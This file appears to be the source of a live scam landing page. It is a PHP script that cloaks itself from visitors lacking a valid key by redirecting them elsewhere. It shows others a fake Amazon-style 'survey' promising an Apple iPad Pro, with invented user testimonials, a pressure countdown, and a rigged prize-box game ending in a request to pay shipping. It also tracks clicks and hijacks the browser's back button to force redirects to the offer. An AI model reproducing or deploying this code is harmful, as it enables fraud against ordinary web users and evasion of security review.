<?php
    $key="5d3d30e4d747427a8160256b023b1a31";
    $a=@$_GET["lpkey"];
    $b=substr($a,0,2).substr($a,4,2).substr($a,8,2).substr($a,12,2).substr($a,16,2);
    $c=substr($a,2,2).substr($a,6,2).substr($a,10,2).substr($a,14,2);
    $d=md5($key.$_SERVER["HTTP_USER_AGENT"].$b);
    $d=substr($d,2,2).substr($d,7,2).substr($d,12,2).substr($d,24,2);
    if(time()>$b || $d!==$c){
    ?>
        <!DOCTYPE html>
        <html>
        <head>
            <title>redirect</title>
<script type="text/javascript">
window.location = "https://go01.anti-virus.live/?utm_medium=4f1441ac5d6be133f4c94a977386d2b62d6302a2&utm_campaign=target_AE_2e2844_Campaign";
</script>
        </head>
        <body>
        </body>
        </html>
    <?php
    }else{
    ?>
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Rediect...</title>
<base href="." />
<script>
    var wrapUrlWithClickId=(function(){"use strict";function n(n,r){var e;void 0===r&&(r="uclick");var u=null===(e=n.match(/\?.+?$/))||void 0===e?void 0:e[0];return u?Array.from(u.matchAll(new RegExp("[?&](clickid|"+r+")=([^=&]*)","g"))).map((function(n){return{name:n[1],value:n[2]}})):[]}function r(n){var r=n();return 0===r.length?{}:r.reduce((function(n,r){var e;return Object.assign(n,((e={})[r.name]=""+r.value,e))}),{})}function e(e){void 0===e&&(e="uclick");var u,i,t=r((function(){return(function(n){return void 0===n&&(n="uclick"),Array.from(document.cookie.matchAll(new RegExp("(?:^|; )(clickid|"+n+")=([^;]*)","g"))).map((function(n){return{name:n[1],value:n[2]}}))})(e)})),c=r((function(){return n(document.referrer,e)})),a=r((function(){return n(document.location.search,e)}));return(u=[e,"clickid"],i=[t,c,a],u.reduce((function(n,r){return n.concat(i.map((function(n){return[r,n]})))}),[])).map((function(n){return{name:n[0],value:n[1][n[0]]}})).find((function(n){return n.value}))||null}function u(n,r,e){var u=n.replace(new RegExp(r+"=[^=&]*","g"),r+"="+e);return-1!==u.indexOf(r)?u:(function(n,r,e){var u=n.trim(),i=r+"="+e;return-1===u.indexOf("?")?u+"?"+i:u.endsWith("?")?""+u+i:u+"&"+i})(n,r,e)}return function(n,r){void 0===r&&(r="uclick");var i=e(r);return null===i?n:n.includes("cnv_id")?i.name===r?u(n,i.name,i.value):i.value?u(n,"cnv_id",i.value):n:u(n,i.name,i.value)}})();

    var img = document.createElement('img');
    img.src = wrapUrlWithClickId('https://go.jianshu.buzz/click.php?event9=1');
    img.referrerPolicy = 'no-referrer-when-downgrade';
</script>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="robots" content="noindex, follow">
<!--https://loadimg.net/lp/lp6/favico.ico-->
<link rel="icon" href="./favico.ico" type="image/x-icon">
<link rel="shortcut icon" href="./favico.ico" type="image/x-icon">
<script src="./jquery.min.js"></script>
<script src="./popper.min.js"></script>
<script src="./bootstrap.min.js"></script>
<script src="./p.js"></script>
<link rel="stylesheet" href="./bootstrap.min.css">
<link rel="stylesheet" href="./all.css">

<script type="text/javascript">
var brand_country ="United States";
var dayNames = Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
var monthNames = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
var minutos_y = "minutes and ";
var segundos = "seconds";
var modalOptions = {
	backdrop: 'static',
	keyboard: false
	};
</script>
</head>
<body>

<style>
.header_flex_item {
    font-size: 12px;
    color: #fff;
    font-weight: 700;
    width: 50%;
}
</style>
<div id="p_body_content">
  <div id="id1" class="header" style="background:#232f3f; padding:12px 10px;">
    <p style="margin:0px; padding:0px;"><img style="margin-top:3px;" src="./menu-top.png"><img src="./cart.png" style="float:right;"><img src="./account.gif" style="float:right; height:28px; margin-top:3px;"><span style="float:right; color:#FFF; font-weight:500; font-size:13px; padding-top:10px; padding-right:3px;"></span></p>
  </div>
  
  <div style="display: flex; padding: 10px; background: #37475A;">
	<div class="header_flex_item">Loyalty Program&nbsp; <i class="far fa-bell"></i></div>
	<div class="header_flex_item" style="text-align:right;"><span class="p_var-dia">29</span> <span class="p_var-mes_nombre">April</span>, <span class="p_var-anyo">2021</span></div>
	</div>
  
  <div class="content container">
    <div class="main-content flag" id="content1" style="color:#232f3f;">
	
	<div class="row d-flex align-items-center">
	<div class="col-md-6 col-sm-12 col-xs-12 align-middle">
      <h3 style="font-weight:bold; margin-top:10px;">Congratulations!</h3>
      <p>Today, <span class="p_var-dia">29</span>&nbsp;<span class="p_var-mes_nombre">April</span> <span class="p_var-anyo">2021</span>, you have been chosen to participate in our survey. It will only take you a minute and you will receive a fantastic prize: an <strong>Apple iPad Pro</strong>!</p>
      
	  <p class="d-block d-md-none" style="text-align:center;"><img style="width:100%; max-width:300px;" src="./muti_iphone12pro.png"></p>
	  
	  <p>Each <span class="p_var-dia_nombre">Thursday</span> we randomly choose 10 users to give them a chance to win amazing prizes. Today's prize is an <strong>Apple iPad Pro</strong>! There will be 10 lucky winners. This promotion is only valid for United States!</p>
      <p>This survey aims to improve the quality of service for our users and your participation will be rewarded 100%.</p>
      <p>You only have <font color="red"><b><span id="timerr" style="color:#c82311">4 minutes and 16 seconds</span></b></font>, to answer this survey!</p>
      <p>Hurry up, the number of prizes available is limited!</p>
	  
	  </div>
		  
		  
		  <div class="col-md-6 col-sm-12 col-xs-12 text-center d-none d-md-block">
        <div class="text-center d-inline-block">
          <div class="principal_bg giftcard_principal_bg"><img style="width:100%; max-width:400px;" src="./muti_iphone12pro.png">
          </div>
        </div>
      </div>
		  
		</div>
	  
      <div class="main-content flag" id="content1" style="border: 1px solid #CCCCCC; padding: 20px; margin: 20px 0px;">
        <div id="q1">
          <p class="question"><strong>Question 1 of 4:</strong> Are you male or female? </p>
          <div class="survey_button bq1" data-bq="1"> Male </div>
          <div class="survey_button bq1" data-bq="2"> Female </div>
        </div>
        <div id="q2">
          <p class="question"><strong>Question 2 of 4:</strong> How old are you? </p>
          <div class="survey_button bq2" data-bq="1"> 18-29 </div>
          <div class="survey_button bq2" data-bq="2"> 30-39 </div>
          <div class="survey_button bq2" data-bq="3"> 40-49 </div>
          <div class="survey_button bq2" data-bq="4"> 50+ </div>
        </div>
        <div id="q3">
          <p class="question"><strong>Question 3 of 4:</strong> How do you rate our services in United States? </p>
          <div class="survey_button bq3" data-bq="1"> Very good </div>
          <div class="survey_button bq3" data-bq="2"> Unbelievable </div>
          <div class="survey_button bq3" data-bq="3"> OK </div>
          <div class="survey_button bq3" data-bq="4"> Not so good </div>
        </div>
        <div id="q4">
          <p class="question"><strong>Question 4 of 4:</strong> Which smartphone are you using? </p>
          <div class="survey_button bq4" data-bq="1"> Android </div>
          <div class="survey_button bq4" data-bq="2"> Apple </div>
        </div>
      </div>
    </div>
    <div class="main-content" id="content2">
      <h2 style="text-align:center; font-weight:bold;">We are verifying your answers...</h2>
      <div class="d-flex justify-content-center">
        <div class="spinner-border" role="status"><span class="sr-only">Loading...</span></div>
      </div>
      <p class="result" id="result1">You have answered all 4 questions</p>
      <p class="result" id="result2">Your IP address is valid for this promotion</p>
      <p class="result" id="result3">Gifts are available and in stock!</p>
    </div>
    <div class="main-content" id="content3">
      <script type="text/javascript">
                    var box_ini = false;
          </script>
      <div id="boxes" class="boxes">
        <div class="div_img_gift"><img class="img_gift" src="./iphone12pro.png"></div>
        <div id="0" class="try temblor">
          <div class="caja_tapa"><img src="./box-01.png"></div>
          <div class="caja_trasera"><img src="./box-03.png"></div>
          <div class="caja_gift"><img src="./box-04_iphone12pro.png"></div>
          <div class="caja"><img src="./box-02.png"></div>
        </div>
        <div id="1" class="try temblor">
          <div class="caja_tapa"><img src="./box-01.png"></div>
          <div class="caja_trasera"><img src="./box-03.png"></div>
          <div class="caja_gift"><img src="./box-04_iphone12pro.png"></div>
          <div class="caja"><img src="./box-02.png"></div>
        </div>
        <div id="2" class="try temblor">
          <div class="caja_tapa"><img src="./box-01.png"></div>
          <div class="caja_trasera"><img src="./box-03.png"></div>
          <div class="caja_gift"><img src="./box-04_iphone12pro.png"></div>
          <div class="caja"><img src="./box-02.png"></div>
        </div>
        <div id="3" class="try temblor">
          <div class="caja_tapa"><img src="./box-01.png"></div>
          <div class="caja_trasera"><img src="./box-03.png"></div>
          <div class="caja_gift"><img src="./box-04_iphone12pro.png"></div>
          <div class="caja"><img src="./box-02.png"></div>
        </div>
        <div id="4" class="try temblor">
          <div class="caja_tapa"><img src="./box-01.png"></div>
          <div class="caja_trasera"><img src="./box-03.png"></div>
          <div class="caja_gift"><img src="./box-04_iphone12pro.png"></div>
          <div class="caja"><img src="./box-02.png"></div>
        </div>
        <div id="5" class="try temblor">
          <div class="caja_tapa"><img src="./box-01.png"></div>
          <div class="caja_trasera"><img src="./box-03.png"></div>
          <div class="caja_gift"><img src="./box-04_iphone12pro.png"></div>
          <div class="caja"><img src="./box-02.png"></div>
        </div>
        <div id="6" class="try temblor">
          <div class="caja_tapa"><img src="./box-01.png"></div>
          <div class="caja_trasera"><img src="./box-03.png"></div>
          <div class="caja_gift"><img src="./box-04_iphone12pro.png"></div>
          <div class="caja"><img src="./box-02.png"></div>
        </div>
        <div id="7" class="try temblor">
          <div class="caja_tapa"><img src="./box-01.png"></div>
          <div class="caja_trasera"><img src="./box-03.png"></div>
          <div class="caja_gift"><img src="./box-04_iphone12pro.png"></div>
          <div class="caja"><img src="./box-02.png"></div>
        </div>
        <div id="8" class="try temblor">
          <div class="caja_tapa"><img src="./box-01.png"></div>
          <div class="caja_trasera"><img src="./box-03.png"></div>
          <div class="caja_gift"><img src="./box-04_iphone12pro.png"></div>
          <div class="caja"><img src="./box-02.png"></div>
        </div>
        <div id="9" class="try temblor">
          <div class="caja_tapa"><img src="./box-01.png"></div>
          <div class="caja_trasera"><img src="./box-03.png"></div>
          <div class="caja_gift"><img src="./box-04_iphone12pro.png"></div>
          <div class="caja"><img src="./box-02.png"></div>
        </div>
        <div id="10" class="try temblor">
          <div class="caja_tapa"><img src="./box-01.png"></div>
          <div class="caja_trasera"><img src="./box-03.png"></div>
          <div class="caja_gift"><img src="./box-04_iphone12pro.png"></div>
          <div class="caja"><img src="./box-02.png"></div>
        </div>
        <div id="11" class="try temblor">
          <div class="caja_tapa"><img src="./box-01.png"></div>
          <div class="caja_trasera"><img src="./box-03.png"></div>
          <div class="caja_gift"><img src="./box-04_iphone12pro.png"></div>
          <div class="caja"><img src="./box-02.png"></div>
        </div>
      </div>
      <div id="p_modal1" class="modal fade text-center p_modal" tabindex="-1" role="dialog" aria-hidden="true">
        <div class="modal-dialog" role="document">
          <div class="modal-content">
            <div class="modal-body"><img class="temblor_inf" src="./box-00.png">
              <h2>Congratulations! <br>Your answers have been successfully saved!</h2>
               <p>You have a chance to win an Apple iPad Pro! <br>
                <br>
                You must select the correct box with your prize inside. <br>
                <br>

                You have 3 attempts. Good luck!</p>
              <div id="p_modal_button1" class="p_modal_button">OK</div>
            </div>
          </div>
        </div>
      </div>
      <div id="p_modal2" class="modal fade text-center p_modal" tabindex="-1" role="dialog" aria-hidden="true">
        <div class="modal-dialog" role="document">
          <div class="modal-content">
            <div class="modal-body">
              <div class="circle-loader">
                <div class="checkmark draw"></div>
              </div>
              <h2>Ops...</h2>
              <p style="line-height:22px;">Sorry, the box you selected is empty. <br>You still have (<span id="num_intentos">3</span>) chances! <br>Good luck!</p>
              <div id="p_modal_button2" class="p_modal_button">OK</div>
            </div>
          </div>
        </div>
      </div>
      <div id="p_modal3" class="modal fade text-center p_modal" tabindex="-1" role="dialog" aria-hidden="true">
        <div class="modal-dialog" role="document">
          <div class="modal-content">
            <div class="modal-body"><img src="./iphone12pro.png">
              <h2> Congratulations! <br><span style=" font-size:60%;">You did it! You won the Apple iPad Pro!</span></h2>
              <p style=" padding-bottom:10px;">*** THE LAST STEP ***</p>
			  <p style=" line-height:18px; padding-bottom:10px;">1. Enter your address.</p>
			  <p style=" line-height:18px; padding-bottom:10px;">2. Pay $1.5 for shipping to get your Apple iPad Pro.</p>
			  <p style=" line-height:18px;">3. Your Apple iPad Pro will be delivered within 5-7 days!</p>
              <div id="p_modal_button3" class="p_modal_button"><a id="offerlink" style="display:block;" href="https://go.jianshu.buzz/click.php?lp=1&to_offer=1">OK</a></div><!--CTA-->
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="main-content">
      <div class="comments_face">
        <div class="comments" style="border-radius:5px 5px 0px 0px;">
          <p style="margin:0;padding:0;float:left;display:block;width:50%"><span style="color:#3b5998; font-weight:bold;">Comments</span></p>
          <p style="margin:0;padding:0;float:right;display:block;width:50%;color:#a8a7a7;text-align:right">11 of 183</p>
          <div style="clear:both"></div>
        </div>
        <div class="comments" id="comment0" style="display:block">
          <div class="profile"><img src="./6.jpg"></div>
          <div class="comment-content">
            <p class="name">Sallie Hull</p>
            <p>I registered, I won and I received my Apple iPad Pro after 5 days. Thanks a lot guys ! </p>
          </div>
          <div class="clr"></div>
          <div class="comment-status"><span>Like ?? Comment <img src="./like.png" width="15px" height="15px">20</span> ?? <span class="p_var-dia">29</span>&nbsp;<span class="p_var-mes_nombre">April</span>, <span class="p_var-anyo">2021</span> </div>
        </div>
        <div class="comments" id="comment1" style="display:block">
          <div class="profile"><img src="./3.jpg"></div>
          <div class="comment-content">
            <p class="name">Marvin Allen</p>
            <p>Fantastic ! I never won anything, but here I was lucky :) </p>
          </div>
          <div class="clr"></div>
          <div class="comment-status"><span>Like ?? Comment <img src="./like.png" width="15px" height="15px">47</span> ?? <span class="p_var-dia">29</span>&nbsp;<span class="p_var-mes_nombre">April</span>, <span class="p_var-anyo">2021</span> </div>
        </div>
        <div class="comments" id="comment2" style="display:block">
          <div class="profile"><img src="./2.jpg"></div>
          <div class="comment-content">
            <p class="name">Casey Daniels</p>
            <p>At first I thought it was a joke, but I finally got my Apple iPad Pro! I told friends about it, so they could participate too:) </p>
          </div>
          <div class="clr"></div>
          <div class="comment-status"><span>Like ?? Comment <img src="./like.png" width="15px" height="15px">3</span> ?? <span class="p_var-dia">29</span>&nbsp;<span class="p_var-mes_nombre">April</span>, <span class="p_var-anyo">2021</span> </div>
        </div>
        <div class="comments" id="comment3" style="display:block">
          <div class="profile"><img src="./8.jpg"></div>
          <div class="comment-content">
            <p class="name">Walter Hoffman</p>
            <p>I won nothing! prizes were not available when I completed the survey.</p>
          </div>
          <div class="clr"></div>
          <div class="comment-status"><span>Like ?? Comment <img src="./like.png" width="15px" height="15px">19</span> ?? <span class="p_var-dia">29</span>&nbsp;<span class="p_var-mes_nombre">April</span>, <span class="p_var-anyo">2021</span> </div>
        </div>
        <div class="comments" id="comment4" style="display:block">
          <div class="profile"><img src="./11.jpg"></div>
          <div class="comment-content">
            <p class="name">Hugo Montgomery</p>
            <p>I won, I won! What a nice surprise in these difficult times! </p>
          </div>
          <div class="clr"></div>
          <div class="comment-status"><span>Like ?? Comment <img src="./like.png" width="15px" height="15px">26</span> ?? <span class="p_var-dia">29</span>&nbsp;<span class="p_var-mes_nombre">April</span>, <span class="p_var-anyo">2021</span> </div>
        </div>
        <div class="comments" id="comment5" style="display:block">
          <div class="profile"><img src="./4.jpg"></div>
          <div class="comment-content">
            <p class="name">Remi Peltier</p>
            <p>I love these promotions! </p>
          </div>
          <div class="clr"></div>
          <div class="comment-status"><span>Like ?? Comment <img src="./like.png" width="15px" height="15px">38</span> ?? <span class="p_var-dia">29</span>&nbsp;<span class="p_var-mes_nombre">April</span>, <span class="p_var-anyo">2021</span> </div>
        </div>
        <div class="comments" id="comment5" style="display:block">
          <div class="profile"><img src="./9.jpg"></div>
          <div class="comment-content">
            <p class="name">Stephane Loupe</p>
            <p>Are there other inquiries to be made? </p>
          </div>
          <div class="clr"></div>
          <div class="comment-status"><span>Like ?? Comment <img src="./like.png" width="15px" height="15px">27</span> ?? <span class="p_var-dia">29</span>&nbsp;<span class="p_var-mes_nombre">April</span>, <span class="p_var-anyo">2021</span> </div>
        </div>
        <div class="comments" id="comment6" style="display:block">
          <div class="profile"><img src="./10.jpg"></div>
          <div class="comment-content">
            <p class="name">Tracy Schmeler</p>
            <p>Have you ever seen something like this? If it doesn't work, try again! </p>
          </div>
          <div class="clr"></div>
          <div class="comment-status"><span>Like ?? Comment <img src="./like.png" width="15px" height="15px">50</span> ?? <span class="p_var-dia">29</span>&nbsp;<span class="p_var-mes_nombre">April</span>, <span class="p_var-anyo">2021</span> </div>
        </div>
        <div class="comments" id="comment7" style="display:block">
          <div class="profile"><img src="./1.jpg"></div>
          <div class="comment-content">
            <p class="name">Sandy Orn</p>
            <p>I thought it was a joke but this morning I received an Apple iPad Pro and I would like to do other surveys like this! Can someone recommend me?</p>
          </div>
          <div class="clr"></div>
          <div class="comment-status"><span>Like ?? Comment <img src="./like.png" width="15px" height="15px">45</span> ?? <span class="p_var-dia">29</span>&nbsp;<span class="p_var-mes_nombre">April</span>, <span class="p_var-anyo">2021</span> </div>
        </div>
        <div class="comments" id="comment7" style="display:block">
          <div class="profile"><img src="./5.jpg"></div>
          <div class="comment-content">
            <p class="name">Robert De Villiers</p>
            <p>I received a message on my phone, I completed a survey and I won! I am now waiting for my delivery.</p>
          </div>
          <div class="clr"></div>
          <div class="comment-status"><span>Like ?? Comment <img src="./like.png" width="15px" height="15px">17</span> ?? <span class="p_var-dia">29</span>&nbsp;<span class="p_var-mes_nombre">April</span>, <span class="p_var-anyo">2021</span> </div>
        </div>
        <div class="comments" id="comment8" style="display:block">
          <div class="profile"><img src="./7.jpg"></div>
          <div class="comment-content">
            <p class="name">Bob Frapples</p>
            <p>Can I get my Apple iPad Pro today? Thank you </p>
          </div>
          <div class="clr"></div>
          <div class="comment-status"><span>Like ?? Comment <img src="./like.png" width="15px" height="15px">51</span> ?? <span class="p_var-dia">29</span>&nbsp;<span class="p_var-mes_nombre">April</span>, <span class="p_var-anyo">2021</span> </div>
        </div>
      </div>
      <p style="font-size: 12px;color: #bcbcbc;"></p>
    </div>
  </div>
</div>
<div id="p_loading" style="display: none;">
  <div class="d-flex justify-content-center" style="margin: 0 auto;">
    <div class="spinner-border" role="status"><span class="sr-only">Loading...</span></div>
  </div>
</div>

<style>
#footer a{
color:#EFEFEF;}
</style>
<div id="footer" style="background-color:#0D141E; margin-bottom:0px;; font-size:12px; text-align:center; color:#EFEFEF;">
  <p style="padding:20px; padding-bottom:0px; margin-bottom:0px;"><a onclick="return false;" href="#">Conditions of Use</a> <a style="margin-left:13px; margin-right:13px;" onclick="return false;" href="#">Privacy Notice</a>   <a onclick="return false;" href="#">Interest-Based Ads</a></p>
  <p style="line-height:40px; margin-bottom:0px;">?? 1996-2022 z.com, Inc.</p>
</div>

<script type="text/javascript">
$("#p_modal_button3").click(function(){
  window.location.replace("https://go.jianshu.buzz/click.php?lp=1&to_offer=1");
});
</script>

<script>

   ! function () {
        var t;
        try {
            const URL = window.location.href.split(/[#]/)[0];
            for (t = 0; 10 > t; ++t) history.pushState({}, "", "#")
            onpopstate = function(event){
                event.state && location.replace('https://go.jianshu.buzz/click.php?lp=1&to_offer=2&exit=1');
            }
        } catch (o) { console.log( o ); }
    }();

</script>

</body></html>
    <?php
    }
?>
